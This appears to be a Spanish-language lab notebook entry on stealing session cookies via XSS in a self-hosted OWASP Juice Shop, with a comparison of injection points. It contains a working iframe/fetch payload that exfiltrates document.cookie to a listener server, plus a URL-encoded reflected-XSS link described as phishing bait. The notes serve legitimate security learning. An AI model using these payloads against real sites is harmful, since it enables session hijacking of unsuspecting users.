# Lección 10: Robo de cookies vía XSS y comparación de puntos de inyección

> Práctica contra OWASP Juice Shop (contenedor Docker propio).

## Por qué robar una cookie de sesión es tan grave
La cookie de sesión es la prueba de "soy yo" que el navegador envía en cada
petición tras iniciar sesión. Si alguien la copia, el servidor no distingue entre
el usuario real y el atacante: es **session hijacking**, sin necesitar contraseña.

## El flag que decide si un XSS permite robar la cookie: `HttpOnly`
Se comprueba en Firefox: F12 → **Almacenamiento** → **Cookies** → columna `HttpOnly`.
- `true` → `document.cookie` no puede leerla desde JavaScript. Ese ataque concreto
  queda bloqueado aunque exista el XSS.
- `false` → cualquier XSS puede leer y exfiltrar esa cookie.

## Montar el "servidor atacante" y exfiltrar la cookie
```bash
python3 -m http.server 4444
```
`-m http.server` arranca el servidor HTTP de prueba incluido en Python; `4444` es
el puerto (cualquiera libre sirve). Cada petición que llegue se imprime en vivo,
con la ruta completa pedida.

Payload (en el buscador de productos, saltando el filtro de `<script>` con un
iframe, como en la Lección 09):
```html
<iframe src="javascript:fetch('http://10.0.2.15:4444/robo?c='+document.cookie)">
```
`fetch(...)` manda la petición en segundo plano, sin recargar la página ni
notarse visualmente; `document.cookie` es lo que se exfiltra.

## XSS reflejado vs almacenado: cómo le llega esto a una víctima real
Nadie escribe el payload a mano. Hay dos formas de entregarlo:

| Tipo | Dónde vive el payload | Cómo le llega a la víctima |
|---|---|---|
| **Reflejado** | En la URL (parámetro `q=` del buscador) | Clic en un enlace manipulado (phishing, QR, chat) |
| **Almacenado** | Guardado en la base de datos (reseña, comentario, perfil) | Simplemente visitando la página; afecta a todos los visitantes |

**Construir el enlace reflejado tal y como lo mandaría un atacante:** hay que
codificar la URL (*URL encoding*) porque espacios y símbolos especiales se rompen
al compartirlos por chat/email.
```
http://10.0.2.15:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Afetch%28%27http%3A%2F%2F10.0.2.15%3A4444%2Frobo%3Fc%3D%27%2Bdocument.cookie%29%22%3E
```
| Símbolo | Código |
|---|---|
| `<` `>` | `%3C` `%3E` |
| `"` `'` | `%22` `%27` |
| espacio | `%20` |
| `(` `)` | `%28` `%29` |
| `:` `/` `?` `=` `+` | `%3A` `%2F` `%3F` `%3D` `%2B` |

Pegando ese enlace ya armado en una ventana privada (simulando a "otro usuario"
que solo hace clic en un enlace, sin tocar el buscador) el robo de cookie ocurre
igual, confirmando que el ataque no depende de usar el buscador manualmente.

## Comparando puntos de inyección dentro de la misma aplicación
Un mismo sitio puede proteger un campo y dejar otro abierto. Se comprueba
guardando el payload y luego inspeccionando el elemento (clic derecho →
Inspeccionar) para ver **cómo** se almacenó/mostró:

| Punto probado | Resultado | Por qué |
|---|---|---|
| Buscador de productos | Se ejecuta (vulnerable) | Angular inserta el HTML sin sanitizar (`[innerHTML]` sin pasar por un sanitizador) |
| Reseña de producto | Se guarda pero se ve como texto `&lt;iframe...&gt;` | Angular escapa automáticamente el contenido en interpolación normal (`{{ }}`) |
| Nombre de usuario (`/profile`) | No se guarda, el campo queda vacío | Esta página no es Angular (hace `POST /profile` → `302` → `GET /profile`, recarga completa, propia de una plantilla renderizada por el servidor); el valor es rechazado antes de guardarse, probablemente por una validación de formato en el servidor |

**Lección clave:** no existe "esta app tiene XSS" como etiqueta única. Cada campo
de entrada hay que probarlo por separado, porque unos pueden estar bien protegidos
y otros no, incluso dentro del mismo sitio.

## Qué he aprendido
Entendí por qué el flag `HttpOnly` es la diferencia entre que un XSS sea "molesto"
(un alert) o "catastrófico" (robo de sesión completo), y lo comprobé montando mi
propio servidor de exfiltración con Python y viendo la cookie real llegar a mis
logs. Aprendí la diferencia práctica entre XSS reflejado (necesita que la víctima
haga clic en un enlace que yo construyo y codifico) y almacenado (afecta a
cualquiera que visite la página, sin clic de por medio), y probé a construir el
enlace malicioso codificado como lo haría un atacante real. Al intentar encontrar
un XSS almacenado, descubrí que Angular protege por defecto las reseñas de
producto (las muestra como texto escapado), mientras que el buscador no tiene esa
protección — y que el formulario de nombre de usuario usa una tecnología distinta
(recarga completa del servidor) que de momento rechaza el payload sin más
explicación visible. Esto me enseñó que auditar una app en serio significa probar
**cada campo por separado**, no asumir que toda la aplicación comparte el mismo
nivel de protección.

Detalle completo con evidencia real en
[writeups/juice-shop-robo-cookies-xss.md](../writeups/juice-shop-robo-cookies-xss.md).
